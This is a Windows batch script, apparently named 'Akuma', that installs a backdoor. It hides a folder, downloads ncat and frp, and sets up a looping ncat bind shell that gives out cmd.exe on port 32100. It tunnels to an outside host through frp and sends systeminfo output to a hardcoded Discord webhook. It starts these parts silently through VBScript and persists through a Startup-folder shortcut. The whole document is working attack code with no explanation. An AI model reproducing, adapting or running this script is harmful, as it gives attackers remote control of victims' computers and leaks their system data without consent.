%homedrive%
rmdir /s /q %homedrive%\Akuma
mkdir %homedrive%\Akuma
attrib +h %homedrive%\Akuma
cd %homedrive%\Akuma
curl -O https://nmap.org/dist/ncat-portable-5.59BETA1.zip
curl -O https://github.com/fatedier/frp/releases/download/v0.52.1/frp_0.52.1_windows_amd64.zip
tar -xf ncat-portable-5.59BETA1.zip
tar -xf frp_0.52.1_windows_amd64.zip
echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=bot" https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\zonbi.bat
echo :start >> %homedrive%\Akuma\ncat.bat
echo %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\ncat.bat
echo goto start >> %homedrive%\Akuma\ncat.bat
echo serverAddr = "4kum4n0d3z3r0.xyz" >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
echo serverPort = 32101 >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
echo :start >> %homedrive%\Akuma\frpc.bat
echo %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.exe
echo goto start >> %homedrive%\Akuma\frpc.bat
echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\ncat.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\frpc.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
start %homedrive%\Akuma\Akuma.vbs
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
